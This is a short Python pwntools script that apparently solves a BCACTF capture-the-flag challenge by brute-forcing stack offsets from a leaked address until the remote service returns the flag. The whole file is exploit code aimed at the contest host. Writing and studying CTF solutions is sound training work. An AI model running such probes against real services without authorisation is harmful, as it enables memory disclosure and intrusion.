#!/usr/bin/python3
from pwn import *

host = 'challs.bcactf.com'
port = 31049
# tryOffset = -0x150
tryOffset = 32
# tryOffset = -2

while True:
    io = remote(host, port)
    # io = process('./provided')
    io.recvuntil(b'0x')
    stackFrame = int(io.recvline().strip(), 16)

    log.info(f'stackFrame: {hex(stackFrame)}')
    # try looking for flag in stack, stack grows upwards
    io.sendlineafter(b'guess>', f'{hex(stackFrame + tryOffset)}'.encode())
    info(f'Trying: {hex(stackFrame + tryOffset)}')
    info(f'Try offset: {tryOffset}, {hex(abs(tryOffset))}')
    
    response = io.recvall()
    if b'bcactf{' in response:
        print(response.decode())
        break
    else:
        log.failure("Failed")
        tryOffset += 2
        io.close()